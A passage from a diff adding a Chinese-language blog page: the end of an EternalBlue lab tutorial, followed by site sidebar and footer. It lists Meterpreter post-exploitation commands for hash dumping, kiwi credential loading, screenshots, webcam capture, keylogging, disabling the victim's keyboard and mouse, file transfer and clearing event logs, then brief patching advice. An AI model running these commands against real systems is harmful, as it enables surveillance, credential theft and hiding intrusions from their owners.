+<li>查看靶机相关信息：sysinfo</li>
+</ul>
+<p><img src="/img/yonghengzhilan/image-20230131213441745.png" alt="image-20230131213441745"></p>
+<ul>
+<li>截图：screenshot</li>
+</ul>
+<p><img src="/img/yonghengzhilan/image-20230131213456656.png" alt="image-20230131213456656"></p>
+<ul>
+<li><p>获取靶机hash,破解密码：hashdump</p>
+</li>
+<li><p>输入hashdump</p>
+</li>
+</ul>
+<p><img src="/img/yonghengzhilan/image-20230131213522519.png" alt="image-20230131213522519"></p>
+<ul>
+<li>寻找一个在线MD5解密网站进行解密</li>
+</ul>
+<hr>
+<p>还有很多其他的操作这里就不一一演示了</p>
+<p>run scraper #查看目标主机详细信息</p>
+<p>load kiwi    #加载</p>
+<p>pwd    #查看目标当前目录(windows)</p>
+<p>getlwd   #查看目标当前目录(Linux)</p>
+<p>search -f *.jsp -d e:\        #搜索E盘中所有以.jsp为后缀的文件</p>
+<p>download e:\test.txt /root #将目标机的e:\test.txt文件下载到/root目录下</p>
+<p>upload /root/test.txt d:\test   #将/root/test.txt上传到目标机的 d:\test\ 目录下</p>
+<p>getpid    #查看当前Meterpreter Shell的进程</p>
+<p>idletime  #查看主机运行时间</p>
+<p>getuid    #查看获取的当前权限</p>
+<p>screenshot #截图</p>
+<p>webcam_list #查看目标主机的摄像头</p>
+<p>webcam_snap #拍照</p>
+<p>webcam_stream                #开视频</p>
+<p>execute 参数 -f 可执行文件 #执行可执行程序</p>
+<p>run getgui -e          #开启远程桌面</p>
+<p>keyscan_start          #开启键盘记录功能</p>
+<p>keyscan_dump        #显示捕捉到的键盘记录信息</p>
+<p>keyscan_stop         #停止键盘记录功能</p>
+<p>uictl disable keyboard     #禁止目标使用键盘</p>
+<p>uictl enable keyboard     #允许目标使用键盘</p>
+<p>uictl disable mouse       #禁止目标使用鼠标</p>
+<p>uictl enable mouse     #允许目标使用鼠标</p>
+<p>clearev            #清除日志</p>
+<h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><p>1.关闭bios服务，或开启防火墙，屏蔽服务端口</p>
+<p>2.给系统打上永恒之蓝的漏洞修复补丁</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/31/yonghengzhilan/" data-id="clech12ol0006v0uz9ks38r36" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/02/21/redis%E5%92%8C%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95/">redis和密钥登录</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/21/frp%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93/">frp内网隧道</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/21/dns%E9%9A%A7%E9%81%93/">dns隧道</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/21/icmp%E9%9A%A7%E9%81%93/">icmp隧道</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/21/neo-regreg/">neo-regreg代理</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
